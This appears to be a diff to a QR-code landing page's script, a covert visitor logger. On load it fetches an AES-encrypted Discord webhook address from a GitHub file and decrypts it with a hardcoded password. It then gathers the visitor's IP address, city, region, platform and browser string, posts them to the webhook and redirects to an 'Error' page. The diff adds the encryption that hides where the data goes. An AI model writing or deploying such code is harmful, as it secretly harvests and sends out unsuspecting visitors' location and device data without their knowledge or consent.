@@ -49,31 +49,83 @@
     </div>
 
     <script>
-        // GitHub raw content URL (replace with your actual GitHub raw URL)
-        const GITHUB_WEBHOOK_URL = "https://github.com/radmehrmc/folsgno/raw/refs/heads/main/fg";
-        // Or for Gist: "https://gist.githubusercontent.com/yourusername/gistid/raw/webhook.txt"
+        // GitHub raw content URL (encrypted with AES)
+        const GITHUB_ENCRYPTED_URL = "https://github.com/radmehrmc/folsgno/raw/refs/heads/main/fg";
+        const DECRYPTION_PASSWORD = "HED#788";
 
-        // Function to fetch webhook from GitHub
+        // ------------------- AES Decryption Helpers -------------------
+        async function deriveKey(password, salt) {
+            const encoder = new TextEncoder();
+            const keyMaterial = await crypto.subtle.importKey(
+                "raw",
+                encoder.encode(password),
+                "PBKDF2",
+                false,
+                ["deriveKey"]
+            );
+            return crypto.subtle.deriveKey(
+                {
+                    name: "PBKDF2",
+                    salt: salt,
+                    iterations: 100000,
+                    hash: "SHA-256"
+                },
+                keyMaterial,
+                { name: "AES-CBC", length: 256 },
+                false,
+                ["decrypt"]
+            );
+        }
+
+        async function decryptAes(base64Data, password) {
+            // Decode base64 to binary
+            const encryptedBytes = Uint8Array.from(atob(base64Data), c => c.charCodeAt(0));
+            
+            // Extract salt (16 bytes), IV (16 bytes), ciphertext (rest)
+            const salt = encryptedBytes.slice(0, 16);
+            const iv = encryptedBytes.slice(16, 32);
+            const ciphertext = encryptedBytes.slice(32);
+            
+            // Derive key using PBKDF2
+            const key = await deriveKey(password, salt);
+            
+            // Decrypt
+            const decrypted = await crypto.subtle.decrypt(
+                { name: "AES-CBC", iv: iv },
+                key,
+                ciphertext
+            );
+            
+            // Convert decrypted bytes to string
+            const decoder = new TextDecoder();
+            return decoder.decode(decrypted);
+        }
+
+        // ------------------- Fetch & Decrypt Webhook -------------------
         async function getWebhookFromGitHub() {
             try {
-                const response = await fetch(GITHUB_WEBHOOK_URL + '?t=' + Date.now()); // Cache bust
-                if (!response.ok) throw new Error('Failed to fetch webhook');
+                const response = await fetch(GITHUB_ENCRYPTED_URL + '?t=' + Date.now());
+                if (!response.ok) throw new Error('Failed to fetch encrypted webhook');
                 
-                const webhookUrl = (await response.text()).trim();
+                const encryptedBase64 = (await response.text()).trim();
+                if (!encryptedBase64) throw new Error('Empty encrypted data');
+                
+                // Decrypt using AES with the given password
+                const webhookUrl = await decryptAes(encryptedBase64, DECRYPTION_PASSWORD);
                 
                 // Basic validation
                 if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
-                    throw new Error('Invalid webhook URL format');
+                    throw new Error('Decrypted URL has invalid format');
                 }
                 
                 return webhookUrl;
             } catch (error) {
-                console.error('Error fetching webhook:', error);
+                console.error('Error fetching/decrypting webhook:', error);
                 return null;
             }
         }
 
-        // Function to get IP information
+        // ------------------- IP & Browser Info -------------------
         async function getIPInfo() {
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -107,7 +159,7 @@
             }
         }
 
-        // Function to send data to Discord webhook
+        // ------------------- Send to Discord -------------------
         async function sendToDiscord(webhookUrl, data) {
             try {
                 const message = {
@@ -117,33 +169,13 @@
                             title: "QR Code Scan Information",
                             color: 16711680,
                             fields: [
-                                {
-                                    name: "IP Address",
-                                    value: data.ip,
-                                    inline: true
-                                },
-                                {
-                                    name: "Location",
-                                    value: data.location.country_name ? 
-                                        `${data.location.city}, ${data.location.region}, ${data.location.country_name}` : 
-                                        'Unknown',
-                                    inline: true
-                                },
-                                {
-                                    name: "Device",
-                                    value: data.browser.platform,
-                                    inline: true
-                                },
-                                {
-                                    name: "Browser",
-                                    value: data.browser.userAgent.substring(0, 50) + '...',
-                                    inline: false
-                                },
-                                {
-                                    name: "Timestamp",
-                                    value: new Date(data.timestamp).toLocaleString(),
-                                    inline: true
-                                }
+                                { name: "IP Address", value: data.ip, inline: true },
+                                { name: "Location", value: data.location.country_name ? 
+                                    `${data.location.city}, ${data.location.region}, ${data.location.country_name}` : 
+                                    'Unknown', inline: true },
+                                { name: "Device", value: data.browser.platform, inline: true },
+                                { name: "Browser", value: data.browser.userAgent.substring(0, 50) + '...', inline: false },
+                                { name: "Timestamp", value: new Date(data.timestamp).toLocaleString(), inline: true }
                             ]
                         }
                     ]
@@ -151,12 +183,9 @@
                 
                 const response = await fetch(webhookUrl, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(message)
                 });
-                
                 return response.ok;
             } catch (error) {
                 console.error('Error sending to Discord:', error);
@@ -164,35 +193,32 @@
             }
         }
 
-        // Function to redirect to YouTube
+        // ------------------- Redirect -------------------
         function mnsterredir() {
             window.location.href = 'https://mainredirectm.vercel.app/Error.html';
         }
 
-        // Main execution
+        // ------------------- Main Execution -------------------
         async function main() {
-            // First get the webhook from GitHub
+            // 1. Fetch and decrypt webhook URL
             const webhookUrl = await getWebhookFromGitHub();
             
             if (!webhookUrl) {
-                console.log('Failed to get webhook, redirecting without tracking');
+                console.log('Failed to obtain webhook, redirecting without tracking');
                 setTimeout(mnsterredir, 2000);
                 return;
             }
             
-            // Get IP information
+            // 2. Collect IP info
             const ipInfo = await getIPInfo();
-            
             if (ipInfo) {
-                // Send to Discord using the fetched webhook
                 await sendToDiscord(webhookUrl, ipInfo);
             }
             
-            // Redirect to YouTube after 2 seconds
+            // 3. Redirect after 1 second
             setTimeout(mnsterredir, 1000);
         }
 
-        // Run the main function
         main();
     </script>
 </body>
